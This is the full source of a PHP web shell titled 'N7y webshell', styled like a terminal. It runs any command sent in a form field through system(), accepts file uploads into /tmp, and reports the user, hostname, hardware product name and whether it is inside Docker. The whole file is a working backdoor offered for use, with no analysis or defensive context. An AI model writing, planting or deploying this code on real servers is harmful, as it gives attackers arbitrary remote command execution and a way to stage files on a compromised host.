<!-- N7y -->
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>N7y webshell</title>
	<style type="text/css">
		* {
		    padding: 0;
		    margin: 0;
		    box-sizing: border-box;
		    font-family: Courier, monospace;
		    background-color: black;
		}
		.container {
		  /*background-color: red;*/	
	      margin-left: 100px;
	      margin-top: 50px;
	      color: white;
	      font-family: monospace;
	      height: 100vh;
	      
		}
		form {
			position: relative;
    		display: flex; 
    		align-content: baseline;
		}
		
		form input {
			background-color: transparent;
      		color: white;
      		border: none;
      		outline: none;
      		width: 100%;
      		margin-left: 4px;
		}
		form i {
			position: absolute;
			width: 12px;
			height: 80%;
			background-color: gray;
			left: 130px;
			top: 10%;
			animation-name: blink;
			animation-duration: 800ms;
			animation-iteration-count: infinite;
			opacity: 1;
		}
		form input:focus + i {
			display: none;
		}
		@keyframes blink {
			from { opacity: 1; }
			to { opacity: 0; }
		}
		.ret {
			width: 90%;
			height: 500px;
			background: rgba(88,88,88,0.3);
			padding: 23px;
			font-size: 15px;
			font-family: Courier, monospace;
			overflow-x: scroll;
			overflow-y: scroll;
		}
		.info {
			/*display: table-caption;*/
			margin-left: 73%;
		}
		.upbtn {
			    background: none;
			    border: none;
			    padding: 0 !important;
			    font-family: arial, sans-serif;
			    color: #069;
			    text-decoration: underline;
			    cursor: pointer;
			    text-decoration: none;

		}
	</style>
</head>
<body>
	<?php 
		$usr = system('whoami');
		$hn = system('hostname');
		$prompt = "[" . $usr . "@" . $hn . "]->";
	 	$date = date('Y-m-d H:i:s');
	 	if (file_exists('/.dockerenv')) {
	 		$dock = "True";
	 	}else {
	 		$dock = "False";
	 	}
	 	
	 	if (($_FILES['up']['name']!="")){
			$file = $_FILES['up']['name'];
			$temp_name = $_FILES['up']['tmp_name'];
	
			
			if 	(move_uploaded_file($temp_name,"/tmp/$file")) {
			 	echo "";
			}
			
		}


	 ?>
	<div class="container">
		<div class="info"><?php echo "Date : " .$date; echo "<br> Product : ";system('cat /sys/class/dmi/id/product_name');echo "<br> In Docker : " . $dock; ?><br><form id="form" method="POST" enctype="multipart/form-data" ><p onclick="document.getElementById('up').click()">/upload</p> <input type="file" value="up" name="up" id="up" style="visibility:hidden;" onclick="crbtn()"><br></form></div>
		<form  method="POST" autocomplete="off" >
			<p style="color: snow;font-family: Courier, monospace;"><?php echo $prompt ?></p><input style="color: snow;font-family: Courier, monospace" type="name" name="cmd"  placeholder="" autocomplete="false" ><i></i>
			
		</form>
		<div class="ret">
			<?php 
				if (isset($_POST['cmd'])) {
	 				$cm = $_POST['cmd'];
	 				$ret = system($cm) . "<br>";

	 			}else {
	 				$ret = "";
	 			}
			 ?>
		</div>

	</div>


<script type="text/javascript">
		function crbtn() {
			var fm = document.getElementById('form');
			const btn = document.createElement('button');
			btn.setAttribute('type', 'submit');
			btn.setAttribute('class', 'upbtn');
			btn.innerHTML += 'upload /tmp/';
			fm.appendChild(btn);
		}
	</script>




</body>
</html>